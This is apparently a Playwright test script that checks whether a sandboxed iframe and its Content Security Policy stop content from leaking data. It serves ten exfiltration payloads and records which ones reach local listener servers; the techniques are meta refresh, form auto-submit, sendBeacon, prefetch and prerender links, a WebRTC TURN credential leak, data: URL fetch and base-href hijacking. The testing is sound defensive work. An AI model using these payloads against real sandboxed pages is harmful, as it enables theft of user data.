import http from 'node:http';
import dgram from 'node:dgram';
import { createRequire } from 'node:module';
const require = createRequire('/home/uni/Code/uni-app-contract/package.json');
const { chromium } = require('@playwright/test');
const { buildSrcdoc: __b } = await import('../../src/interface/srcdoc.ts'); const { FRAME_KIT } = await import('../../src/interface/kits/frameKit.ts'); const buildSrcdoc = (h) => __b(h, { kitSource: FRAME_KIT, headExtra: '' });

let hostBody='';
const hostSrv = http.createServer((q,r)=>{r.writeHead(200,process.env.PCSP?{'content-type':'text/html','content-security-policy':process.env.PCSP}:{'content-type':'text/html'});r.end(hostBody)}).listen(1437);
const hits = [];
const leak = http.createServer((req, res) => { hits.push(req.url); res.writeHead(200, {'content-type':'text/html','access-control-allow-origin':'*'}); res.end('<script>parent.postMessage("data-doc-loaded","*")</script>ok'); }).listen(1436);
const udp = dgram.createSocket('udp4'); const udpHits = []; udp.on('message', (m) => udpHits.push(m.toString('latin1'))); udp.bind(1438, '127.0.0.1');

const cases = {
  selfnav: `<script>location.href='http://127.0.0.1:1436/leak?selfnav=SECRET'</script>`,
  metarefresh: `<meta http-equiv="refresh" content="0;url=http://127.0.0.1:1436/leak?meta=SECRET">`,
  anchor: `<a id=a href="http://127.0.0.1:1436/leak?anchor=SECRET">x</a><script>document.getElementById('a').click()</script>`,
  datanav: `<script>location.href='data:text/html,'+encodeURIComponent('<script>fetch("http://127.0.0.1:1436/leak?datafetch=SECRET",{mode:"no-cors"});new Image().src="http://127.0.0.1:1436/leak?dataimg=SECRET"<\\/script>')</script>`,
  prefetch: `<link rel="prefetch" href="http://127.0.0.1:1436/leak?prefetch=SECRET"><link rel="preconnect" href="http://127.0.0.1:1436"><link rel="dns-prefetch" href="//127.0.0.1:1436"><link rel="prerender" href="http://127.0.0.1:1436/leak?prerender=SECRET">`,
  form: `<form id=f action="http://127.0.0.1:1436/leak?form=SECRET" method=get><input name=q value=SECRET></form><script>document.getElementById('f').submit()</script>`,
  beacon: `<script>navigator.sendBeacon('http://127.0.0.1:1436/leak?beacon=SECRET','x')</script>`,
  webrtc: `<script>(async()=>{const pc=new RTCPeerConnection({iceServers:[{urls:'turn:127.0.0.1:1438',username:'SECRETUSER',credential:'x'}]});pc.createDataChannel('x');await pc.setLocalDescription(await pc.createOffer());})().catch(e=>0)</script>`,
  windowopen: `<script>window.open('http://127.0.0.1:1436/leak?open=SECRET')</script>`,
  base: `<base href="http://127.0.0.1:1436/"><img src="leak?base=SECRET"><script src="leak?basescript=SECRET"></script>`,
};
const shapes = { plain: (b)=>b, comment: (b)=>`<!-- c -->${b}`, doctypeWs: (b)=>`  \n<!DOCTYPE   html>${b}`, upper: (b)=>`<HTML><HEAD></HEAD><BODY>${b}</BODY></HTML>` };

const browser = await chromium.launch();
const page = await browser.newPage();
page.on('console', () => {});
const results = {};
for (const [name, body] of Object.entries(cases)) {
  hits.length = 0; udpHits.length = 0;
  const html = process.env.NOCSP ? body : buildSrcdoc(body);
  const host = `<!doctype html><body><iframe sandbox="allow-scripts" id=f></iframe><script>document.getElementById('f').srcdoc=${JSON.stringify(html).replace(/</g,"\\u003c")}</script>`;
  hostBody=host;
  await page.goto('http://127.0.0.1:1437/');
  await page.waitForTimeout(2500);
  results[name] = { http: [...hits], udp: udpHits.length, udpHasSecret: udpHits.some(x=>x.includes('SECRETUSER')), url: page.url() };
}
console.log(JSON.stringify(results, null, 1));
await browser.close(); leak.close(); hostSrv.close(); udp.close();
